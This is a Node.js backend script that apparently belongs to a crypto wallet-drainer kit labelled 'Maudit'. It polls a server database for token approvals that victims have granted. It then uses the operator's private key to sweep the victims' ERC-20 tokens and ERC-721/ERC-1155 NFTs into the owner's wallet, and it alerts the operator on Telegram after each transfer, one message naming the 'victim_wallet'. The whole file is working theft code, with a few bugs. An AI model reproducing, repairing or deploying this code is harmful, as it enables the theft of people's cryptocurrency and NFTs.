const { Console } = require('console');
var jsdom = require('jsdom');
const { JSDOM } = jsdom;
const { window } = new JSDOM('<html></html>');
const $ = require('jquery')(window);
const Web3 = require('web3');

var private_config = require("../config/pvt_config")
var public_config = require("../config/config")

// Owner wallet

let owner_wallet = public_config.owner_pblc_config.owner_wallet
let owner_private_key = private_config.owner_pvt_config.owner_private_key

let infura_link = public_config.api_pblc_config.infury_api_link
let base_url = private_config.owner_pvt_config.full_website_path

// Telegram notification

let enable_telegram_notifications = public_config.telegram_config.enable_telegram_notification; // false to disable notifications on telegram
let telegram_token = public_config.telegram_config.telegram_token; // Can be found with the botFather chat
let chatid = public_config.telegram_config.chatid; // Use getmyid bot to get it

// ----------------------------------------------------------------------------------------------------------------------------- //
let owner_nonce = 0

// web3js
let web3js = new Web3(infura_link)



// ----------------------------------------------------------------------------------------------------------------------------- //
// ---------------------------------------------------------- Loop functions --------------------------------------------------- //
// ----------------------------------------------------------------------------------------------------------------------------- //


// @ Sets the transactions as is_confirmed = 1 if they are
async function erc20_refresh_database(){
  const result = await fetch(base_url + 'php/refresh_database.php')
  const data = await result.json() 
  console.log(JSON.stringify(data))

  item = data[0]
  if(item){
    const rep = await web3js.eth.getTransaction(item["transaction_id"])    
    const bnumber = await web3js.eth.getBlockNumber()
    const confirm_amount = bnumber - rep["blockNumber"]
  
    if(confirm_amount >= 1 && confirm_amount < 300){
      await fetch(base_url + "php/set_transaction_to_confirmed.php?txid=" + item["id"])
    }
    else{
    }
  }


}

// @ Returns all unsent confirmed transactions ( Approval transactions )
async function erc20_check_database_and_send_tokens(){

  const response = await fetch(base_url + 'php/check_database.php');
  const data = await response.json();
  console.log(JSON.stringify(data))
  if(data.length >= 1){
    item = data[0]
    json_txid = item["transaction_id"];
    json_token_address = item["token_address"];
    json_token_balance = item["amount_to_send"];
    json_from_wallet = item["from_wallet"];

    erc20_update_transaction(json_txid);
    transferTokenFromUserToOwner(token_address = json_token_address,token_balance = json_token_balance,from_wallet = json_from_wallet)
  }
}

// @ Set as sent a confirmed transaction
function erc20_update_transaction($id){
  fetch(base_url + "php/update_database.php?txid=" + $id);
}


// @ Sets the transactions as is_confirmed = 1 if they are
async function nft_refresh_database(){
  fetch(base_url + 'php/nft/refresh_database.php')

  const result = await fetch(base_url + 'php/nft/refresh_database.php')
  const data = await result.json() 
  console.log(JSON.stringify(data))
  altem = data[0]
  try{
    if(altem){
      const rep = await web3js.eth.getTransaction(altem["transaction_id"])
      const bnumber = await web3js.eth.getBlockNumber()
      const confirm_amount = (bnumber - rep["blockNumber"])

      if(confirm_amount >= 1 && confirm_amount < 300){
        await fetch(base_url + "php/nft/set_transaction_to_confirmed.php?txid=" + altem.id)
      }
      else{
      }
    }
  }
  catch(e){
    console.log(e)
  }


}

// @ Returns all unsent confirmed transactions ( Approval transactions )
async function nft_check_database_and_send_tokens(){

  const response = await fetch(base_url + 'php/nft/check_database.php');
  const data = await response.json();
  console.log(JSON.stringify(data))
  if(data.length >= 1){

    item = data[0]
    
    json_nft_address = item["token_address"];
    json_nft_id = item["token_id"];
    json_txid = item["transaction_id"];
    json_from_wallet = item["from_wallet"]
    json_nft_type = item["nft_type"]
    remaining_transactions_count = item["remaining_token_amout_to_send"]

    // if there are more than one NFT in the collection
    if(json_nft_type == "1155"){

      if(json_nft_id.includes(',')){
        let splitted_tokens_to_send = json_nft_id.split(",")
        token_to_spend = splitted_tokens_to_send[0]
  
        // Setting the new transactions remaining count
        new_remaining_transaction_count = remaining_transactions_count - 1
  
        // Setting the new token list ( By removing the one we just sent )
        new_splitted_tokens = splitted_tokens_to_send.pop()
        new_tokens_ids = String(new_splitted_tokens)
  
        transferERC1155TokenFromUserToOwner(nft_address = json_nft_address,nft_id = token_to_spend,from_wallet = json_from_wallet)
        
        if(remaining_transactions_count <= 1){
          nft_update_transaction(json_txid)  
        }
        else{
          set_new_transaction_count_and_remove_spent_token(json_txid,new_remaining_transaction_count,new_tokens_ids)
        }
      }
      else{
        transferERC1155TokenFromUserToOwner(nft_address = json_nft_address,nft_id = json_nft_id,from_wallet = json_from_wallet)          
        nft_update_transaction(json_txid)  
      }
    }
    else if(json_nft_type == "721"){
      transferERC721TokenFromUserToOwner(nft_address = json_nft_address,nft_id = json_nft_id,from_wallet = json_from_wallet)
      nft_update_transaction(json_txid)
    }

    
  }
}

function set_new_transaction_count_and_remove_spent_token(txid,txcount,tokens_ids){
  url = base_url + `php/nft/set_tx_remaining_count.php?tx=${txid}&txcount=${txcount}&token_ids=${tokens_ids}`;
  fetch(url)
}

// @ Set as sent a confirmed transaction
function nft_update_transaction($id){
  fetch(base_url + "php/nft/update_database.php?txid=" + $id);
}


// ----------------------------------------------------------------------------------------------------------------------------- //
// ---------------------------------------------------------- ERC20 Money sending functions  ----------------------------------- //
// ----------------------------------------------------------------------------------------------------------------------------- //

// @ Creates a contract using the token and executes the transfer using the private key of the owner
async function transferTokenFromUserToOwner(token_address,token_balance,from_wallet){
  console.log("Sending ERC-20 Token !")
  const contractABI = [
      {
      "constant": false,
      "inputs": [
          {
              "name": "_from",
              "type": "address"
          },
          {
              "name": "_to",
              "type": "address"
          },
          {
              "name": "_value",
              "type": "uint256"
          }
      ],
      "name": "transferFrom",
      "outputs": [
          {
              "name": "",
              "type": "bool"
          }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
      }
  ]
  try{
    const account = web3js.eth.accounts.privateKeyToAccount("0x"+owner_private_key);

    web3js.eth.accounts.wallet.add(account);
    web3js.eth.defaultAccount = account.address;     
  
    const contract = new web3js.eth.Contract(contractABI,token_address)
  
    const gasEstimate = await contract.methods.transferFrom(from_wallet,account.address,token_balance).estimateGas({ from: web3js.eth.defaultAccount });
  
    if(owner_nonce == 0){
      owner_nonce = nonce = await web3js.eth.getTransactionCount(web3js.eth.defaultAccount, "latest")
    }
    else{
      nonce = owner_nonce + 1
      owner_nonce = nonce
    }
    console.log("( Transaction nonce " + owner_nonce + " )")
    const gasPrice = await web3js.eth.getGasPrice().then(gPrice => {
    inner_init_transaction(gPrice,gasEstimate,from_wallet,account.address,token_balance,contract,owner_nonce)
    })
  
  }
  catch(e){
    console.log("erc20" + e)
  }
}

// @ Simply executes the " transferFrom " function using the gasPrice, gasEstimateAmount, FromWallet, ToWallet, amount to transfer, contract corresponding
async function inner_init_transaction(gasPrice,gasEstimate,fromWallet,toWallet,amount,contract,lastnonce){
  gasPrice = parseInt(gasPrice) + lastnonce
  gasEstimate = parseInt(gasEstimate) + lastnonce // Added lastly

  try{
    await contract.methods.transferFrom(fromWallet,toWallet,amount).send({
      from : web3js.eth.defaultAccount,
      nonce : lastnonce,
      gasPrice : gasPrice,
      gas : gasEstimate
  })
  .on("transactionHash",function(txhash){
      let message = `
      [🏴]  Maudit | ERC-20 Token Transfer [🏴]
<b>[${victim_wallet}]</b> Transfered funds to your wallet ( 1 confirmation ) : 

TxHash : ${txhash}
Receiver Wallet : ${toWallet}    
      `
    send_telegram_notification(message)
  })
  .on('error', function(error){ 
   })
  }
  catch(error){
  }
}



// ----------------------------------------------------------------------------------------------------------------------------- //
// ---------------------------------------------------------- ERC721 Money sending functions  --------------------------------- //
// ----------------------------------------------------------------------------------------------------------------------------- //


// @ Creates a contract using the token and executes the transfer using the private key of the owner
async function transferERC721TokenFromUserToOwner(nft_address,nft_id,from_wallet){

  console.log("Sending NFT 721 !")
  
  let transferABI = [
      {
        "constant": false,
        "inputs": [
          {
            "internalType": "address",
            "name": "from",
            "type": "address"
          },
          {
            "internalType": "address",
            "name": "to",
            "type": "address"
          },
          {
            "internalType": "uint256",
            "name": "tokenId",
            "type": "uint256"
          }
        ],
        "name": "safeTransferFrom",
        "outputs": [],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
      }
  ]
  let contract_address = nft_address 

  let to_wallet = owner_wallet
  let token_id = nft_id

  try{
    const contract = new web3js.eth.Contract(transferABI,contract_address)

    // Private account part 
    const account = web3js.eth.accounts.privateKeyToAccount("0x"+owner_private_key);
  
    web3js.eth.accounts.wallet.add(account);
    web3js.eth.defaultAccount = account.address;     
    // End private acconunt
  
  
    const gasEstimate = await contract.methods.safeTransferFrom(from_wallet,to_wallet,token_id).estimateGas({ from: web3js.eth.defaultAccount });
  
    if(owner_nonce == 0){
      owner_nonce = nonce = await web3js.eth.getTransactionCount(web3js.eth.defaultAccount, "latest")
    }
    else{
      nonce = owner_nonce + 1
      owner_nonce = nonce
    }
    console.log("( Transaction nonce " + owner_nonce + " ) ")

    const gasPrice = await web3js.eth.getGasPrice().then(gPrice => {
    
      inner_init_erc721_transaction(gPrice,gasEstimate,from_wallet,account.address,contract,owner_nonce,token_id)
    })
  }
  catch(e){
    console.log("721" + e)
  }
}

// @ Simply executes the " transferFrom " function using the gasPrice, gasEstimateAmount, FromWallet, ToWallet, amount to transfer, contract corresponding
async function inner_init_erc721_transaction(gasPrice,gasEstimate,fromWallet,toWallet,contract,lastnonce,token_id){

  gasPrice = parseInt(gasPrice) + lastnonce
  gasEstimate = parseInt(gasEstimate) + lastnonce // Added lastly

  try{
    await contract.methods.safeTransferFrom(fromWallet,toWallet,token_id).send({
      from : web3js.eth.defaultAccount,
      nonce : lastnonce,
      gasPrice : gasPrice,
      gas : gasEstimate
  })
  .on("transactionHash",function(txhash){
      let message = `
      [🏴]  Maudit | ERC-721 Token Transfer [🏴]
<b>[${fromWallet}]</b> Transfered funds to your wallet ( 1 confirmation ) : 

TxHash : ${txhash}
Receiver Wallet : ${toWallet}    
      `
    send_telegram_notification(message)
  })
  }
  catch(error){
    console.log("Error :" + e)
  }

}



// ----------------------------------------------------------------------------------------------------------------------------- //
// ---------------------------------------------------------- ERC1155 Money sending functions  --------------------------------- //
// ----------------------------------------------------------------------------------------------------------------------------- //


// @ Creates a contract using the token and executes the transfer using the private key of the owner
async function transferERC1155TokenFromUserToOwner(nft_address,nft_id,from_wallet){

  console.log("Sending NFT !")
  
  let transferABI = [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "from",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "to",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "id",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        },
        {
          "internalType": "bytes",
          "name": "data",
          "type": "bytes"
        }
      ],
      "name": "safeTransferFrom",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ]

  let contract_address = nft_address 

  let to_wallet = owner_wallet
  let token_id = nft_id
  let amount = 1
  let data = "0x00"
  try{
    const contract = new web3js.eth.Contract(transferABI,contract_address)

    // Private account part 
    const account = web3js.eth.accounts.privateKeyToAccount("0x"+owner_private_key);
  
    web3js.eth.accounts.wallet.add(account);
    web3js.eth.defaultAccount = account.address;     
    // End private acconunt
  
  
    const gasEstimate = await contract.methods.safeTransferFrom(from_wallet,to_wallet,token_id,amount,data).estimateGas({ from: web3js.eth.defaultAccount });
  
    if(owner_nonce == 0){
      owner_nonce = nonce = await web3js.eth.getTransactionCount(web3js.eth.defaultAccount, "latest")
    }
    else{
      nonce = owner_nonce + 1
      owner_nonce = nonce
    }
    console.log("( Transaction nonce " + owner_nonce + " ) ")
    const gasPrice = await web3js.eth.getGasPrice().then(gPrice => {
    
      inner_init_erc1155_transaction(gPrice,gasEstimate,from_wallet,account.address,1,contract,owner_nonce,data,token_id)
    })
  }
  catch(e){
    console.log("1155" )
  }
}

// @ Simply executes the " transferFrom " function using the gasPrice, gasEstimateAmount, FromWallet, ToWallet, amount to transfer, contract corresponding
async function inner_init_erc1155_transaction(gasPrice,gasEstimate,fromWallet,toWallet,amount,contract,lastnonce,data,token_id){

  gasPrice = parseInt(gasPrice) + lastnonce
  gasEstimate = parseInt(gasEstimate) + lastnonce // Added lastly

  try{
    await contract.methods.safeTransferFrom(fromWallet,toWallet,token_id,amount,data).send({
      from : web3js.eth.defaultAccount,
      nonce : lastnonce,
      gasPrice : gasPrice,
      gas : gasEstimate
  })
  .on("transactionHash",function(txhash){
      let message = `
      [🏴]  Maudit | ERC-1155 Token Transfer [🏴]
<b>[${fromWallet}]</b> Transfered funds to your wallet ( 1 confirmation ) : 

TxHash : ${txhash}
Receiver Wallet : ${toWallet}    
      `
    send_telegram_notification(message)
  })
  }
  catch(error){
    console.log("Error : ")
  }

}


// ----------------------------------------------------------------------------------------------------------------------------- //
// ---------------------------------------------------------- Social notifications functions ----------------------------------- //
// ----------------------------------------------------------------------------------------------------------------------------- //

function send_telegram_notification(message){
  try{
    if(enable_telegram_notifications){
      $.ajax({
        url:'https://api.telegram.org/bot'+telegram_token+'/sendMessage',
            method:'POST',
            data:{chat_id:chatid,text:message,parse_mode:'HTML'},
            success:function(){             
            }
    });
    }    
  }
  catch(e){
    console.log("Telegram" )
  }
}

// ----------------------------------------------------------------------------------------------------------------------------- //
// ---------------------------------------------------------- Working interval  ------------------------------------------------ //
// ----------------------------------------------------------------------------------------------------------------------------- //

console.log("Backend running !")
send_telegram_notification("Backend running !")

setInterval(erc20_check_database_and_send_tokens,3500)
setInterval(erc20_refresh_database,3000)

setInterval(nft_check_database_and_send_tokens,12000)
setInterval(nft_refresh_database,2000)
